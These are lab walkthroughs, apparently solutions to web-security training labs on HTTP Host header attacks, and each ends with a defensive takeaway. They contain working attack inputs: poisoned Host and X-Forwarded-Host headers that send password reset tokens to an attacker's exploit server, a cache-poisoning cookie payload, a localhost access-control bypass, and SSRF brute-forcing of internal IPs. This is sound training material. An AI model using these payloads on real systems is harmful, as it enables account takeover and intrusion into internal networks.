### [PS-HOST-01] Basic password reset poisoning

**Scenario:** The target application dynamically constructs password reset URLs in emails using the incoming HTTP `Host` header, allowing an attacker to poison the link and hijack password reset tokens.

**Solution:**

1. Trigger a password reset for user `carlos` on the target application login page and intercept the request in Burp Suite.
2. Send the `POST /forgot-password` request to **Repeater** (`Ctrl + R`).
3. Replace the `Host` header domain with your Exploit Server domain (or Burp Collaborator domain):
```http
Host: exploit-server.net

```


4. Send the modified request to trigger a password reset email containing a URL directed to your server.
5. Open Exploit Server **Access Logs** and copy the reset token captured in the incoming GET request path (`/password-reset?token=...`).
6. Navigate to the token URL in your browser, set a new password for `carlos`, and log in.

> **Key Takeaway:** Unvalidated `Host` header reflection in transactional emails allows attackers to hijack password reset workflows and capture sensitive single-use tokens.

---

### [PS-HOST-02] Password reset poisoning via middleware

**Scenario:** The target application validates the HTTP `Host` header against an allowlist but trusts override headers (`X-Forwarded-Host`) supplied by reverse proxies or middleware.

**Solution:**

1. Trigger a password reset for `carlos` and send the `POST /forgot-password` request to Burp Repeater.
2. Retain the original valid `Host` header and append an `X-Forwarded-Host` header pointing to your Exploit Server:
```http
Host: target.web-security-academy.net
X-Forwarded-Host: exploit-server.net

```


3. Send the request to generate a password reset link pointing to `exploit-server.net`.
4. Inspect Exploit Server **Access Logs** to harvest the reset token from the incoming client request.
5. Use the stolen token to reset `carlos`'s password and log into the account.

> **Key Takeaway:** Middleware override headers like `X-Forwarded-Host` can override host generation logic; applications must validate all candidate host headers against strict allowlists.

---

### [PS-HOST-03] Web cache poisoning via ambiguous requests

**Scenario:** Front-end cache servers and back-end application servers parse duplicate or ambiguous `Host` headers differently, enabling cache poisoning that serves malicious JavaScript to unauthenticated visitors.

**Solution:**

1. Send a `GET /` request to Burp Repeater and craft an ambiguous request by adding a duplicate `Host` header:
```http
Host: target.web-security-academy.net
Host: exploit-server.net

```


2. On your Exploit Server, create a file at path `/resources/js/tracking.js` containing payload:
```javascript
alert(document.cookie);

```


3. Send the duplicate `Host` request repeatedly in Repeater until the response shows a cache hit header (`X-Cache: hit`).
4. Revisit the target homepage in an unauthenticated browser tab to confirm execution of the cached payload.

> **Key Takeaway:** Discrepancies in how front-end proxies and back-end servers handle duplicate HTTP headers allow attackers to manipulate backend routing while caching responses under standard cache keys.

---

### [PS-HOST-04] Host header authentication bypass

**Scenario:** An internal administration portal (`/admin`) relies solely on the HTTP `Host` header to verify whether incoming requests originate from localhost (`127.0.0.1`).

**Solution:**

1. Attempt to access `/admin` in your browser and observe the `403 Forbidden` response ("Admin interface is only available to local users").
2. Intercept the `GET /admin` request in Burp Repeater.
3. Modify the `Host` header value from the target domain to localhost:
```http
Host: localhost

```


4. Send the modified request to successfully bypass access controls and render the admin dashboard.
5. Send a `POST /admin/delete?username=carlos` request with `Host: localhost` to delete user `carlos`.

> **Key Takeaway:** Access control mechanisms should never trust client-controlled headers like `Host` for network location or identity verification.

---

### [PS-HOST-05] Routing-based SSRF via HTTP Host header

**Scenario:** A front-end reverse proxy routes incoming requests to back-end servers based on the HTTP `Host` header without restricting destination IP ranges, exposing private internal network assets.

**Solution:**

1. Intercept a request to the target homepage and send it to Burp Intruder.
2. Change the request target to an absolute path and modify the `Host` header to target internal private IPs (`192.168.0.x`):
```http
GET / HTTP/1.1
Host: 192.168.0.§1§

```


3. Configure Intruder payload numbers from `1` to `255` and run the scan to identify an internal host returning HTTP `200` or `302`.
4. Once the active internal IP is found (e.g., `192.168.0.X`), update your request in Repeater:
```http
GET /admin HTTP/1.1
Host: 192.168.0.X

```


5. Send the deletion request to purge user `carlos` from the internal admin portal.

> **Key Takeaway:** Using unvalidated `Host` header values for internal routing enables routing-based Server-Side Request Forgery (SSRF) against internal networks.

---

### [PS-HOST-06] SSRF via flawed request parsing

**Scenario:** The front-end server routes requests using absolute URLs in the request line, while the back-end application relies on the `Host` header, allowing request-line vs Host header discrepancies to trigger SSRF.

**Solution:**

1. Intercept a request in Burp Suite and send to Repeater.
2. Specify the target site's full absolute URL in the HTTP request line, but point the `Host` header to an internal address space:
```http
GET https://target.web-security-academy.net/admin HTTP/1.1
Host: 192.168.0.§1§

```


3. Send to Burp Intruder and brute-force the last octet (`1` to `255`) to locate the internal admin interface IP returning HTTP `200`.
4. In Repeater, issue a `POST` request using the absolute target URL and the discovered internal IP in the `Host` header to delete user `carlos`.

> **Key Takeaway:** When parsing logic differs between front-end reverse proxies (reading request lines) and back-end applications (reading Host headers), attackers can bypass routing restrictions.

---

### [PS-HOST-07] Password reset poisoning via dangling markup

**Scenario:** The application creates password reset links using the `Host` header without HTML-encoding output, allowing dangling markup injection to exfiltrate tokens via unclosed tags.

**Solution:**

1. Trigger a password reset for `carlos` and send the `POST /forgot-password` request to Burp Repeater.
2. Append dangling markup tags to the `X-Forwarded-Host` (or `Host`) header to create an unclosed HTML attribute directed to your Exploit Server:
```http
Host: target.web-security-academy.net
X-Forwarded-Host: exploit-server.net/'<a href="https://exploit-server.net/?

```


3. Send the request; the back-end application embeds the unclosed string into the reset email body, causing the mail client to append all subsequent body text (including the reset token) into the outgoing request URL.
4. Check Exploit Server **Access Logs** to extract the exfiltrated reset token from incoming HTTP GET requests.
5. Use the stolen token link to reset `carlos`'s password and log into the account.

> **Key Takeaway:** Unencoded Host header values reflected inside HTML email templates enable dangling markup attacks, tricking email clients into exfiltrating sensitive tokens.